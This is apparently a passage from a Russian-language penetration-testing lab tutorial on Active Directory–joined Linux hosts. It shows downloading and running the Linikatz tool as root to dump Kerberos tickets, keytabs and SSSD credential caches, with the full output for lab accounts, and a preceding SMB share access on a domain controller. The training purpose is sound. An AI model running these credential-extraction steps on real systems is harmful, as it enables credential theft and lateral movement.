        Start Time: 10/10/2022 5:46:02 (local)
        End Time:   10/10/2022 15:46:02 (local)
        Renew Time: 10/11/2022 5:46:02 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

C:\htb>dir \\dc01\julio
 Volume in drive \\dc01\julio has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\dc01\julio

07/14/2022  07:25 AM    <DIR>          .
07/14/2022  07:25 AM    <DIR>          ..
07/14/2022  04:18 PM                17 julio.txt
               1 File(s)             17 bytes
               2 Dir(s)  18,161,782,784 bytes free
```

---

## Линикац

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) — это инструмент, созданный группой безопасности Cisco для использования учетных данных на компьютерах с Linux при наличии интеграции с Active Directory. Другими словами, Линикац привносит аналогичный принцип в `Mimikatz`для среды UNIX.

Как `Mimikatz`, чтобы воспользоваться Liikatz, нам нужно быть root на машине. Этот инструмент будет извлекать все учетные данные, включая билеты Kerberos, из различных реализаций Kerberos, таких как FreeIPA, SSSD, Samba, Vintella и т. д. После извлечения учетных данных он помещает их в папку, имя которой начинается с `linikatz.`. Внутри этой папки вы найдете учетные данные в различных доступных форматах, включая ccache и keytabs. Их можно использовать по мере необходимости, как описано выше.

#### Загрузка и выполнение Linikaz

Загрузка и выполнение Linikaz

```shell-session
lizergindoma@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
lizergindoma@htb[/htb]$ /opt/linikatz.sh
 _ _       _ _         _
| (_)_ __ (_) | ____ _| |_ ____
| | | '_ \| | |/ / _` | __|_  /
| | | | | | |   < (_| | |_ / /
|_|_|_| |_|_|_|\_\__,_|\__/___|

             =[ @timb_machine ]=

I: [freeipa-check] FreeIPA AD configuration
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Foundation-Firmware
-rw-r--r-- 1 root root 1702 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Hughski-Limited
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd/LVFS-CA.pem
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Foundation-Metadata
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd-metadata/LVFS-CA.pem
I: [sss-check] SSS AD configuration
-rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/timestamps_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  7 12:17 /var/lib/sss/db/config.ldb
-rw------- 1 root root 4154 Oct 10 19:48 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
-rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/cache_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  4 16:26 /var/lib/sss/db/sssd.ldb
-rw-rw-r-- 1 root root 10406312 Oct 10 19:54 /var/lib/sss/mc/initgroups
-rw-rw-r-- 1 root root 6406312 Oct 10 19:55 /var/lib/sss/mc/group
-rw-rw-r-- 1 root root 8406312 Oct 10 19:53 /var/lib/sss/mc/passwd
-rw-r--r-- 1 root root 113 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
-rw-r--r-- 1 root root 40 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
-rw-r--r-- 1 root root 15 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
-rw-r--r-- 1 root root 12 Oct 10 19:55 /var/lib/sss/pubconf/kdcinfo.INLANEFREIGHT.HTB
-rw------- 1 root root 504 Oct  6 11:16 /etc/sssd/sssd.conf
I: [vintella-check] VAS AD configuration
I: [pbis-check] PBIS AD configuration
I: [samba-check] Samba configuration
-rw-r--r-- 1 root root 8942 Oct  4 16:25 /etc/samba/smb.conf
-rw-r--r-- 1 root root 8 Jul 18 12:52 /etc/samba/gdbcommands
I: [kerberos-check] Kerberos configuration
-rw-r--r-- 1 root root 2800 Oct  7 12:17 /etc/krb5.conf
-rw------- 1 root root 1348 Oct  4 16:26 /etc/krb5.keytab
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1406 Oct 10 19:55 /tmp/krb5cc_647401106_HRJDux
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1414 Oct 10 19:55 /tmp/krb5cc_647401106_R9a9hG
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 3175 Oct 10 19:55 /tmp/krb5cc_647402606
I: [samba-check] Samba machine secrets
I: [samba-check] Samba hashes
I: [check] Cached hashes
I: [sss-check] SSS hashes
I: [check] Machine Kerberos tickets
I: [sss-check] SSS ticket list
Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:48:03, Flags: RIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
I: [kerberos-check] User Kerberos tickets
Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/08/2022 11:32:01, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
Ticket cache: FILE:/tmp/krb5cc_647401106_R9a9hG
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:55:02, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
Ticket cache: FILE:/tmp/krb5cc_647402606
Default principal: svc_workstations@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:55:02, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
I: [check] KCM Kerberos tickets
```